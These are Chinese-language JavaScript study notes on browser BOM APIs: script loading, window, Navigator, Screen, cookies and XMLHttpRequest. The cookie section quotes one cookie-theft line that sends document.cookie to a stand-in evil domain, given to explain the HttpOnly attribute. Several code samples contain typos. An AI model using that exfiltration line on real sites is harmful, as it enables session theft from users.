## 第十章 BOM

2021-11-24

### 10.1 BOM基本原理

#### 概念

JS 代码嵌入网页有四种方法：

- script 嵌入内部代码，type = 'text/javascript' 说明脚本的类型。早期浏览器使用 'text/javascript' 新浏览器推荐使用 'application/javascript'。如果是其他参数，脚本不会执行（可以利用这个方法，传入其他信息，使用DOM方法获取脚本内容）
- script 嵌入外部代码，设置 src 属性是外部的JS代码。如果内部外部同时使用，内部代码不会生效。script 脚本可以添加一个 integrity 属性，写入脚本的哈希签名，验证外部脚本的一致性，避免外部脚本篡改。
- HTML 行内代码：事件触发后可以执行脚本 `onclick='console.log('click');'`
- A 内部：`<a href="javascript:console.log('Hello')">点击</a>` 如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。

脚本执行原理：

- 浏览器下载HTML，下载并开始解析
- 遇到 JS 代码，停止HTML解析；开始JS解析；如果是外部JS代码，需要下载完毕后解析JS。如果下载时间较长，会产生阻塞。所以通常把JS脚本放在页面底部。如果在头部加载，DOM没有渲染，可能JS出错
- 解析JS完毕后，继续解析HTML界面

浏览器对于同一个域名下的资源数量有限制，为了避免服务器请求过多；如果资源很多，可以放在不同的域名下。

#### defer 属性

外部的脚本，如果添加了defer属性，就会在HTML下载解析结束后再执行这个脚本。浏览器解析HTML和下载脚本过程是并行的，这样会避免阻塞。

#### async 属性

浏览器遇到async属性的脚本，会使用另一个进程下载脚本，下载过程中不会造成阻塞。下载JS任务和解析HTML是并行的。当脚本下载完毕，暂停DOM渲染，执行JS脚本。执行完毕后，继续界面的DOM渲染。注意：如果多脚本异步下载，先下载的脚本会先执行。

defer 和 async 使用：如果脚本间有较强的依赖性（babel react）需要使用defer（设置async属性是false），如果脚本间没有依赖性，可以使用 async。

#### 加载协议

默认协议是HTTP协议，可以在Scr属性中设置其他协议下载，或者根据界面自身的协议下载。

~~~html
<script src="https://test.js"></script>
<script src="//example.js"></script>
~~~

#### 浏览器组成

浏览器有DOM渲染引擎和JS解释器（JS引擎）组成

**渲染引擎**：Firefox：Gecko；Safari：WebKit ；Chrome：Blink ；IE: Trident ；Edge: EdgeHTML

**渲染引擎工作流程**：HTML解析成DOM，CSS解析成CSSOM（object model），将这两部分合成渲染树（render tree），计算渲染树的布局（layout），将渲染树绘制到屏幕。这几部分不是完全先后执行的，可能一部分已经渲染，另一部分HTML还在下载

#### 重绘和重流

**布局（布局流，flow）和绘制（paint）**：渲染树转化成网页布局（layout）的过程叫布局，网页布局（layout）转化成屏幕显示叫绘制。这两部分会阻塞并且消耗性能。

**重绘和重流**：页面首次生成后，操作脚本和样式表会造成界面的重流或重绘。重流必然造成重绘，重绘不会造成重流。如果改变文字颜色，页面的布局不会改，所以不会重流，只会重绘。如果改变文本内容，界面布局会改变，会重流重绘。浏览器会对比改变前后的渲染树的差别，计算出变化的部分diff，不会重新加载整个网页，只渲染一部分子树。开发中尽量减少重流和重绘，尽量不要改变顶层的DOM节点，table布局和flex布局会消耗性能。

#### 性能优化

- 读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。使用`documentFragment`操作 DOM，使用虚拟 DOM（virtual DOM）库。缓存 DOM 信息。

- 不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。动画使用`absolute`定位或`fixed`定位，这样可以减少对其他元素的影响。只在必要时才显示隐藏元素。

- 使用`window.requestAnimationFrame()`，因为它可以把代码推迟到下一次重流时执行，而不是立即要求页面重流。

  ~~~js
  function doubleHeight(ele) {
    let currentHeight = ele.clientHeight;
    window.requestAnimationFrame(() => {
      // 可以把代码所有的写操作几种到一起，这样会减少DOM变动的开销，重绘代价少
      ele.style.height = (currentHeight * 2) + 'px';
    });
  }
  
  elements.forEach(doubleHeight);
  ~~~

#### **JS 引擎**

JS是解析型语言。早期浏览器内部对 JavaScript 的处理过程如下：

1. 读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
2. 对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
3. 使用“翻译器”（translator），将代码转为字节码（bytecode）。
4. 使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。

逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。

字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机： [V8](https://en.wikipedia.org/wiki/Chrome_V8) (Chrome, Chromium)



### 10.2 window 对象

window对象和JS中普通对象类似，具有属性和方法，也会触发事件。

window对象是当前浏览器窗口的顶层对象。如果一个没有声明的变量直接使用，就会自动转化成顶层对象的属性（window的属性）。

#### 属性

**常规属性**


- window.name 表示当前浏览器窗口的名字（字符串，容量可以高达几MB）；只要浏览器窗口不关闭，跳转另一个页面（或者刷新当前窗口），前一个浏览器窗口名字设置不会变化。
- window.closed 判断窗口是否关闭(可以监测使用脚本打开的新窗口是否关闭)
- window.opener 属性表示打开当前窗口的父窗口 如果没有父窗口，就返回 null。如果两个窗口不需要通信，就设置子窗口 window.opener === null 这样可以切断父窗口的联系。<a>元素添加rel="noopener"属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。
- window.self 
- window.window 指向本身
- window.status 读取浏览器状态栏的文本(兼容早期浏览器)


~~~html
<a href="https://an.evil.site" target="_blank" rel="noopener"></a>
~~~

**框架的属性**


- window.frames 返回当前页面内所有的框架窗口(伪数组) 包括 frame iframe
- window.length 返回框架窗口的数量
- window.frameElement 如果一个窗口被嵌入另一个窗口，这个属性返回原始的父窗口。如果当前窗口是顶层窗口，或者和父窗口不是同源的，那么返回值是null。
- window.top 执行顶层窗口。主要用于框架窗口中获取顶层窗口，如果没有框架，返回window
- window.parent 返回父窗口；如果没有父窗口，返回自身


**高清屏幕的属性**

- window.devicePixelRatio 返回显示像素和物理像素的比值：如果比例较大，说明处于高清屏幕(当前是2)

**位置属性**


- window.screenX screenY 浏览器左上角相对于屏幕的位置
- window.innerHeight window.innerWidth 浏览器视口的尺寸(包括滚动条)如果界面变成200%， 那么视口会变小
- window.outerHeight window.outerWidth 浏览器窗口的尺寸(包括菜单栏和border)
- window.scrollX scrollY 


组件属性：获取浏览器的组件对象（状态栏地址栏工具栏等）

全局对象属性：document/location/navigator/history/localStorage/sessionStorage/console/screen

window.isSecureContext 返回是否处于加密状态（https）

#### 方法


window.alert()
window.confirm()
window.prompt()

window.open(url, windowName, windowFeature)
window.close() 关闭当前的窗口
window.stop() 停止当前窗口的加载(等价于浏览器停止按钮)



第二个参数：windowName：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用_blank，表示新建一个没有名字的窗口。另外还有几个预设值，_self表示当前窗口，_top表示顶层窗口，_parent表示上一层窗口。

open()方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许open方法指向该窗口。如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。

第三个参数表示新打开窗口的属性，是一个字符串(array.join(',')),属性见 https://wangdoc.com/javascript/bom/window.html

~~~js
var popup = window.open(
  'somepage.html',
  'DefinitionsWindows',
  'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
);
~~~

~~~
window.moveTo()
window.moveBy()
把当前窗口移动到某个坐标，或者移动某个位移，这个窗口必须是新建的窗口

window.resizeTo(window.screen.availWidth / 2, window.screen.availHeight / 2)
window.resizeBy(-100, -200)
当前窗口缩放到某个尺寸(屏幕的一半)

window.scrollTo window.scrollBy
window.print()
window.focus() window.blur() 通常打开一个新窗口并获得焦点(显示在页面最前面)

let selectionObj = window.getSelection();
let text = selectionObj.toString();

window.getComputedStyle()
window.matchMedia()
~~~

**window.requestAminationFrame()**

这个方法类似于 setTimeout 会推迟函数到浏览器下一次重流时执行，执行完才会进行下一次重绘，这个函数没有设定时间，浏览器可以根据设备的速度调节执行的时间。如果函数改变网页的布局，可以使用这个方法，这样可以节省系统资源，使得网页效果更加平滑。

window.requestAnimationFrame(callback) 回调函数可以获取一个时间戳，表示距离网页加载的时间

`window.requestAnimationFrame()`的返回值是一个整数，这个整数可以传入window.cancelAnimationFrame()，用来取消回调函数的执行。下面是一个界面动画

~~~js
var element = document.getElementById('animate');
element.style.position = 'absolute';

var start = null;

function step(timestamp) {
  if (!start) {
    start = timestamp;
  }
  var progress = timestamp - start;
  // 元素不断向左移，最大不超过200像素
  element.style.left = Math.min(progress / 10, 200) + 'px';
  // 如果距离第一次执行不超过 2000 毫秒，
  // 就继续执行动画
  if (progress < 2000) {
    window.requestAnimationFrame(step);
  }
}

window.requestAnimationFrame(step);
~~~

**window.requestIdleCallback()**

`window.requestIdleCallback()`跟`setTimeout`类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用`window.requestIdleCallback()`将其推迟执行，以保证网页性能。

它跟`window.requestAnimationFrame()`的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；`window.requestIdleCallback()`可以保证回调函数在系统资源空闲时执行。

该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空虚，都会执行。

```
window.requestIdleCallback(callback[, options])
```

`callback`参数是一个回调函数。该回调函数执行时，系统会传入一个`IdleDeadline`对象作为参数。`IdleDeadline`对象有一个`didTimeout`属性（布尔值，表示是否为超时调用）和一个`timeRemaining()`方法（返回该空闲时段剩余的毫秒数）。

`options`参数是一个配置对象，目前只有`timeout`一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。

`window.requestIdleCallback()`方法返回一个整数。该整数可以传入`window.cancelIdleCallback()`取消回调函数。

下面是一个例子。

```js
requestIdleCallback(myNonEssentialWork);

function myNonEssentialWork(deadline) {
  while (deadline.timeRemaining() > 0) {
    doWorkIfNeeded();
  }
}
```

上面代码中，`requestIdleCallback()`用来执行非关键任务`myNonEssentialWork`。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。

下面是指定`timeout`的例子。

```js
requestIdleCallback(processPendingAnalyticsEvents, { timeout: 2000 });
```

上面代码指定，`processPendingAnalyticsEvents`必须在未来2秒之内执行。

如果由于超时导致回调函数执行，则`deadline.timeRemaining()`返回`0`，`deadline.didTimeout`返回`true`。

如果多次执行`window.requestIdleCallback()`，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。 

#### 事件

~~~js
window.onload = function() {
  //
}
window.onerror = function(message, filename, lineno, colno, error) {
  // JS脚本错误会触发onerror
}
~~~
window.onafterprint：afterprint事件的监听函数。
window.onbeforeprint：beforeprint事件的监听函数。
window.onbeforeunload：beforeunload事件的监听函数。
window.onhashchange：hashchange事件的监听函数。
window.onlanguagechange: languagechange的监听函数。
window.onmessage：message事件的监听函数。
window.onmessageerror：MessageError事件的监听函数。
window.onoffline：offline事件的监听函数。
window.ononline：online事件的监听函数。
window.onpagehide：pagehide事件的监听函数。
window.onpageshow：pageshow事件的监听函数。
window.onpopstate：popstate事件的监听函数。
window.onstorage：storage事件的监听函数。
window.onunhandledrejection：未处理的 Promise 对象的reject事件的监听函数。
window.onunload：unload事件的监听函数。


#### 多窗口操作

一个网页可以使用iframe嵌入其他网页，这样一个界面会嵌套多层网页（这个技术现在过时了）。

通过下面的属性判断是否是顶层窗口：window.top window.parent window.self 

~~~js
if (window.top === window.self) {
  // 当前窗口是顶层窗口
}
~~~

~~~html
<a href="somepage.html" target="_top">Link</a> 表示在顶层窗口打开链接
~~~

**iframe 元素**

~~~js
let iframe = document.getElementBuId('#frame');
let innerWindow = iframe.contentWindow;
let innerDocument = iframe.contemtDocument;
innerWindow.frameElement === iframe
// 获取子窗口的window对象

// 如果在同源的情况下，可以获取内部window的属性
innerWindow.title
~~~

如果父窗口和子窗口处于同源时，两个窗口间可以直接通信

window.frames 可以获取当前窗口中全部子窗口的伪数组



### 10.3 Navigator

Navigator 这个对象可以反映用户浏览器和系统信息

~~~js
Navigator.userAgent // "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36" 获取浏览器的厂商和基本信息。以前通过这个属性获取用户浏览器名称来处理兼容性。现在由于PC端版本复杂，一般不使用了。现在通过功能识别的方式，获取浏览器信息。可以通过这个属性判断手机浏览器和PC端大类

var ua = navigator.userAgent.toLowerCase();

if (/mobi/i.test(ua)) {
  // 手机浏览器
} else {
  // 非手机浏览器
}

/mobi|android|touch|mini/i.test(ua)

Navigator.plugins 返回一个伪数组，是浏览器的插件(flash)
Navigator.platform 用户操作系统 "Linux x86_64" 但是自己测试不生效
Navigator.onLine 返回用户在线或者离线 如果是false，肯定离线；如果是true，可能用户所在局域网也是离线的，可以通过事件监听获取用户在线情况

window.addEventListener('offline', function(e) { console.log('offline'); });
window.addEventListener('online', function(e) { console.log('online'); });

Navigator.language，Navigator.languages 表示用户的首选语言，和可以接受的语言(浏览器翻译界面使用)
~~~

~~~js
Navigator.geolocation 包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用。
Geolocation 对象提供下面三个方法。
Geolocation.getCurrentPosition()：得到用户的当前位置
Geolocation.watchPosition()：监听用户位置变化
Geolocation.clearWatch()：取消watchPosition()方法指定的监听函数
注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。

Navigator.cookieEnabled 这个属性反映的是浏览器总的特性
~~~

下面是常见的方法

~~~js
Navigator.javaEnabled() 返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。
Navigator.sendBeacon() 用于向服务器异步发送数据
~~~

### 10.4  Screen

Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。`window.screen`属性指向这个对象。

- `Screen.height`：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。
- `Screen.width`：浏览器窗口所在的屏幕的宽度（单位像素）。
- `Screen.availHeight`：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于`height`减去那些被系统组件的高度。
- `Screen.availWidth`：浏览器窗口可用的屏幕宽度（单位像素）。
- `Screen.pixelDepth`：整数，表示屏幕的色彩位数，比如`24`表示屏幕提供24位色彩。
- `Screen.colorDepth`：`Screen.pixelDepth`的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。
- `Screen.orientation`：返回一个对象，表示屏幕的方向。该对象的`type`属性是一个字符串，表示屏幕的具体方向，`landscape-primary`表示横放，`landscape-secondary`表示颠倒的横放，`portrait-primary`表示竖放，`portrait-secondary`。

下面是`Screen.orientation`的例子。具体的内容参考：

https://www.cnblogs.com/ndos/p/8245164.html

https://www.cnblogs.com/crafts/articles/5750522.html

```js
window.screen.orientation
// { angle: 0, type: "landscape-primary", onchange: null }
```

下面的例子保证屏幕分辨率大于 1024 x 768。

```js
if (window.screen.width >= 1024 && window.screen.height >= 768) {
  // 分辨率不低于 1024x768
}
```

下面是根据屏幕的宽度，将用户导向不同网页的代码。

```js
if ((screen.width <= 800) && (screen.height <= 600)) {
  window.location.replace('small.html');
} else {
  window.location.replace('wide.html');
}
```

### 10.5 Cookie

#### 概述

cookie 是服务器在浏览器存储的很小的文本信息，通常小于4KB， 浏览器发出请求时，会附带cookie。

服务器可以判断两次的请求是否来源于一个浏览器，可以保存用户自定义设置（语言，侧栏宽度，风格），保存token。

注意：cookie 很小，不适合保存大量数据，如果cookie很大影响性能（大量存储放在storage中）。

cookie包括：

- Cookie 的名字
- Cookie 的值（真正的数据写在这里面）
- 到期时间
- 所属域名（默认是当前域名）：如果是某个域名下的cookie，URL必须是这个域名才能携带这部分cookie
- 生效的路径（默认是当前网址）

可以通过 window.navigator.cookieEnabled 判断浏览器是否支持cookie。

根据同源策略：两个网址只要域名和端口相同可以共享cookie(协议不同也可以)

#### cookie 与 http

浏览器发出请求，服务器在响应头中可以设置cookie(可以设置多个cookie)	如果服务器端想改一个cookie，需要域名和路径完全相同才能改。

~~~bash
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: token=sdfghjklertyuiop
Set-Cookie: tasty_cookie=strawberry
Set-Cookie: key1=value2; domain=example.com; path=/blog
~~~

浏览器发出请求时，就会携带cookie；服务器获取cookie后，不能判断cookie的过期时间和路径

~~~bash
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: token=sdfghjklertyuiop; yummy_cookie=choco; tasty_cookie=strawberry
~~~

#### 属性

Expires Expires 表示cookie的过期时间，浏览器根据本地时间确定cookie是否过期（本地时间可能不准确）；

Max-Age Max-age 表示从现在开始，cookie 存在的秒数（7天内登录）；如果不设置这两个属性，那么 cookie 就是 session（对话） cookie，就在本次对话结束后销毁。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

Domain 说明cookie的域名和路径，只有满足这个域名后，发送请求才添加cookie；

Path 只有URL中包括路径才添加cookie（前提是同源策略，域名和端口号一致）

Secure 只有协议是HTTPS才保存cookie，如果是http请求，浏览器会忽略这个cookie

HTTPOnly 只有http请求才能获取并发送当前的cookie，不能通过脚本获取cookie，避免恶意脚本跨站注入攻击。这里创建一个空图片，并把cookie发送到一个危险网站（用户名和密码）；如果设置了一个 Cookie 的`HttpOnly`属性，JS代码就不会读到该 Cookie。

~~~js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
~~~

document.cookie 获取当前的cookie（HttpOnly属性不设置时可以获取）获取的是cookie字符串，需要转化

~~~js
var cookies = document.cookie.split(';');
~~~

这个属性可写（可以通过脚本对当前网站添加Cookie）==写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值）==，这可以用`encodeURIComponent`方法达到。`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。如果添加多个属性，可以先转化成数组，改变数组，最后保存cookie的值（例如界面评论栏的宽度）；写入cookie 时可以同时写入相关属性（过期时间）

~~~js
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
~~~

Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。

~~~js
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
~~~

### 10.6 XMLHttpequest

#### 概述

Ajax: 异步JS和XML；脚本发起通信，就是ajax。

步骤：创建XMLHttpRequest实例对象，发送请求，服务器响应，获取数据更新界面。

现在ajax返回的数据不是XML格式，通常是JSON格式，但是ajax还保留。现在不仅仅是http协议，file ftp 协议也可以，发送的数据格式不限制。ajax只能向同源网址（协议域名端口相同）发送请求，如果跨域会报错。

下面是原生ajax发送get请求：

~~~js
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      console.log(xhr.responseText);
    } else {
      console.log(xhr.status);
      cosnole.log(xhr.statusText);
    }
  }
};

xhr.omerror = function() {
  console.error(xhr.statusText);
};

xhr.open('GET', 'http://example.com/page.php', true);
// 第三个参数表示异步发送请求
xhr.send(null);
// get 请求不带参数
~~~

上面的案例在 example.com 请求，可以获取下面的返回值。如果不是同源，会显示CORS阻止。

~~~txt
The page at 'https://wangdoc.com/javascript/bom/xmlhttprequest.html' was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint 'http://www.example.com/page.php'. This request has been blocked; the content must be served over HTTPS.
~~~

~~~html
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is established to be used for illustrative examples in documents. You may use this
    domain in examples without prior coordination or asking for permission.</p>
    <p><a href="http://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>
~~~

#### 实例属性

xhr.readyState 表示请求的状态，4表示请求已经完成，属性变化时，
xhr.onreadystatechange 会捕获到这个事件
xhr.response 服务器返回的数据，如果请求状态是4，就是全部返回的数据；如果请求没有结束（3），这个参数就是返回的部分数据；可以使任何的数据类型
xhr.responseType 表示服务器返回的数据类型，属性可写，默认是text。在open方法后，send方法前可以改变这个参数，参数可以取下面的值。

"arraybuffer"：ArrayBuffer 对象，表示服务器返回二进制数组。（使用数组的方式处理二进制数据，例如图片）
"blob"：Blob 对象，表示服务器返回二进制对象。适合图片传递。
"document"：Document 对象，表示服务器返回一个文档对象。操作DOM时，直接返回document可以加载到界面中（需要打开CORS）
"json"：JSON 对象。
"text"：字符串。直接处理比较方便

~~~js
let xhr = new XMLHttpRequest();
xhr.open('GET', 'path/iamge/test.png', true);
xhr.responseType = 'blob';
xhr.onreadystatechange = function() {
  if (xhr.readystate === 4 && xhr.status === 200) {
    let res = xhr.response;
    let blob = new Blob([res], {type: 'image/png'});
    // or let blob = xhr.response
  }
}
xhr.send();

// 二进制数组 arraybuffer 处理图片的请求
xhr.open('GET', 'to/test.png', true);
xhr.responseType = 'arraybuffer';
xhr.onload = function() {
  let uInt8Array = new Uint8Array(this.response);
  for (var i = 0, len = binStr.length; i < len; ++i ) {
    var byte = uInt8Array[i];
  }
}
~~~

下面实例属性是服务器返回值属性

~~~
xhr.responseText 服务器返回的字符串(如果返回的不是txt文本，这个属性是null)
xhr.responseXML (首先设置responseType === document) 这个属性是解析后的DOM树
xhr.responseURL 获取服务器的网址：通常和open中参数相同，网页跳转后，这个网址就是实际返回数据的网址。

xhr.status 返回HTTP状态码
xhr.statusText “OK”和“Not Found” 对应200和404
xhr.timeout 设置毫秒数，如果请求超时，停止请求（下面是例子）
~~~

~~~js
var xhr = new XMLHttpRequest();

xhr.ontimeout = function (e) {
  console.error(e);
};

xhr.onload = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      // 处理服务器返回的数据
    } else {
      console.error(xhr.statusText);
    }
  }
};

xhr.open('GET', url, true);
xhr.timeout = 10 * 1000; // 指定 10 秒钟超时
xhr.send(null);
~~~

下面是事件监听属性

~~~
XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数
XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数
这个事件对象具有三个属性：loaded total lengthComputable(布尔值，表示加载的进度是否可以计算)这里可以使用 loaded/total 获取已加载的百分比

XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了abort()方法）的监听函数
XMLHttpRequest.onerror：error 事件（请求失败）的监听函数
XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数
XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数
XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数
~~~

xhr.withCredentials 表示跨域请求时，用户信息（cookie）是否包含在请求头中（默认是false）如果是同域请求，不需要设置这个属性
浏览器设置 xhr.withCredentials = true; 服务器会返回 Access-Control-Allow-Credentials: true 

上传文件时，可以获取上传的进度，使用 upload 获取上传的进度

~~~html
<process min="0" max="100" value="0">0%</process>
~~~

~~~js
function upload(blobOrFile) {
  let xhr = new XMLHttpRequest();
  xhr.open('POST', '/server', true);
  xhr.onload = function(e) {
    console.log(e);
  }
  let progressBar = document.querySelector('progress');
  xhr.upload.onprogress = function(e) {
    progressBar.value = (e.loaded/e.total) * 100;
    progressBar.textContent = progressBar.value; // 兼容老浏览器
  }
  xhr.send(blobOrFile);
}

let file = new Blob(['hello world']);
upload(file, {type: 'text/plain'});
~~~

#### 实例方法

- xhr.open('GET', url, true, userName, password) 传输的方法，URL，是否异步（默认是异步），用户名和密码（后两个参数可选）如果对使用过open的xhr再次使用open，相当于 abort 关闭这个请求。

- xhr.sned(data); 如果是get请求，只发送URL，这里直接传null即可。如果是post请求，这里需要传入数据。数据的格式可以是blob DOM string arraybuffer formdata(表单更常用)

  ~~~js
  var formData = new FormData();
  formData.append('username', '张三');
  formData.append('email', 'zhangsan@example.com');
  formData.append('birthDate', 1940);
  
  xhr.open('POST', 'http://www.example.com', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send(formData);
  ~~~

- xhr.setRequestHeader('Content-Type', 'application/json');  设置请求头的信息，必须位于xhr.open() 和 xhr.send() 之间。第一个参数是字段名，第二个是字段值。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。

  ~~~
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
  xhr.send(JSON.stringify(data));
  这里设置了数据类型是JSON，设置数据的长度。改进：stringify 耗时，可以执行一次
  ~~~

- xhr.overrideMimeType('text/plain') 这个方法尽量不要使用；如果指定某一个数据类型，返回的数据是text/xml，但是各种原因造成浏览器解析不成功，需要获取原始数据，那么就设置这个属性。如果希望服务器返回指定的数据类型，可以用`responseType`属性告诉服务器。

- xhr.getResponseHeader('Last') 获取响应头的信息

  ~~~js
  xhr.onload = () => {
    console.log(this.getResponseHeader('Last-Modified'));
  }
  ~~~

- xhr.getAllResponseHeaders() 获取响应头的全部信息（字符串）
  
  ~~~
  date: Fri, 08 Dec 2017 21:04:30 GMT\r\n
  content-encoding: gzip\r\n
  x-content-type-options: nosniff\r\n
  server: meinheld/0.6.1\r\n
  x-frame-options: DENY\r\n
  content-type: text/html; charset=utf-8\r\n
  connection: keep-alive\r\n
  strict-transport-security: max-age=63072000\r\n
  vary: Cookie, Accept-Encoding\r\n
  content-length: 6502\r\n
  x-xss-protection: 1; mode=block\r\n
  ~~~
  
  可以处理这个字符串获取信息
  
  ~~~js
  var headerString = xhr.getAllResponseHeaders();
  let arr = headerString.trim().split(/[\r\n]+/);
  let headerInfo = {};
  
  arr.forEach((item) => {
    let parts = item.split(': ');
    let key = parts.shift();
    let value = parts.join(': ');
    headerInfo[key] = value;
  });
  ~~~
  
- xhr.abort() 终止发送的请求，此时 readyState is 4, status is 0.

#### 实例事件

- readystatechange === 4 请求成功，可以获取服务器返回的数据
- progress 返回上传的进度 xhr.addEventListener('progress', updateProgress);
- load abort error
- loadend 上面三个事件后，会触发这个事件，但是不确定是否加载成功
- timeout 超时事件

#### Navigator.sendBeacon()

如果在界面关闭时，需要发送请求，那么请求是异步的，可能界面已经卸载了才发送请求，这样会造成错误。传统的解决思路是设置一个睡眠函数或者消耗函数拖延时间，但是用户体验和浏览器性能不好。

~~~js
// a time-consuming operation, bad
for (let i = 1; i < 10000; i++) {
  for (let m = 1; m < 10000; m++) {
    continue;
  }
}
~~~

所以使用 Navigator.sendBeacon() 方法：这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。

~~~js
// <body onload="analytics('start')" onunload="analytics('end')">
function analytics(state) {
  if (!navigator.sendBeacon) {
    return;
  }
  var data = 'state=' + state + '&location=' + window.location;
  navigator.sendBeacon('http://example.com/analytics', data);
}
~~~

